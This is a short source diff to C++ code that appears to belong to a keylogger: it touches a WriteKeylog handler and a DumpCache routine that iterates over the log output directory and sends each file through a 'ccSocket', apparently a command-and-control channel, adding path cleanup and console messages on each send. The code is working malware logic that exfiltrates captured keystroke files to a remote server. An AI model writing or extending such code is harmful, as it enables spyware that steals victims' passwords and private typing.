@@ -24,6 +24,7 @@
 
 #include <iostream>
 #include <filesystem>
+#include <algorithm>
 
 // LogTimer Handler function
 void WriteKeylog()
@@ -69,6 +70,9 @@ void DumpCache()
 		for (const auto& entry : std::filesystem::directory_iterator(IO::GetOutputPath(false)))
 		{
 			std::string path = Utils::ToString(entry.path());
+			// Remove quotes around path (why the hell does filesystem::directory_entry.path() return them in the first place?)
+			path.erase(std::remove(path.begin(), path.end(), '"'), path.end());
+
 			RESPONSE_CODE res = ccSocket.SendFile(path);
 			if (res == KILL)
 			{
@@ -79,10 +83,12 @@ void DumpCache()
 			else if (res == SUCCESS)
 			{
 				// TODO delete file
+				std::cout << "Sent [" << path << "] Successfully" << std::endl;
 				IO::WriteAppLog("Successfully sent file [" + path + "]");
 			}
 			else
 			{
+				std::cout << "Failed to send [" << path << "]" << std::endl;
 				IO::WriteAppLog("File [" + path + "] failed to send");
 			}
 		}
